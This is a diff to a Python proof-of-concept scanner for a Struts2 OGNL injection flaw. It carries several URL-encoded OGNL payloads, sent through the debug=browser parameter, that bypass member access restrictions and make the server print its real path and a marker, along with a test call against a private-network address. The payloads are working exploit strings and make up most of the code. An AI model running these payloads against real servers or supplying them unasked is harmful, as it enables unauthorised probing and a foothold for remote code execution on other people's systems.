@@ -4,14 +4,18 @@ import requests
 warnings.filterwarnings("ignore")
 
 
-def poc(url):
+def poc(url, **kwargs):
+    if kwargs.get('ip'):
+        url = 'http://' + kwargs.get('ip') + ':' + kwargs.get('port')
+    else:
+        url = url
     timeout = 10
     proxies = {'http': '127.0.0.1:9999'}
-    check = ['\Struts2-vuln-Goop', '/Struts2-vuln-Goop', '-Struts2-vuln-Goop']
+    check = ['Struts2-vuln-Goop1116', '-Struts2-vuln-Goop']
     poc_goop = [
-        r"debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=Struts2-vuln-Goop&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest",
+        r"debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().print(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D)))(#context[#parameters.rpsobj[0]].getWriter().print(1116)):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=Struts2-vuln-Goop&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest",
         r"debug=browser&object=%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2c%23res%3d@org.apache.struts2.ServletActionContext@getResponse%28%29%2c%23w%3d%23res.getWriter%28%29%2c%23w.print%28%27-Struts2-vuln%27%2b%27-Goop%27%29%29",
-        r"debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path))&pp=Struts2-vuln-Goop"
+        r"debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),%23w.print(1116))&pp=Struts2-vuln-Goop"
     ]
     headers = {
         "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
@@ -31,4 +35,6 @@ def poc(url):
     except:
         pass
 
-# test_url =
+if __name__ == '__main__':
+    a = poc("http://192.168.106.130:8080/ajax/example5.action")
+    print(a)
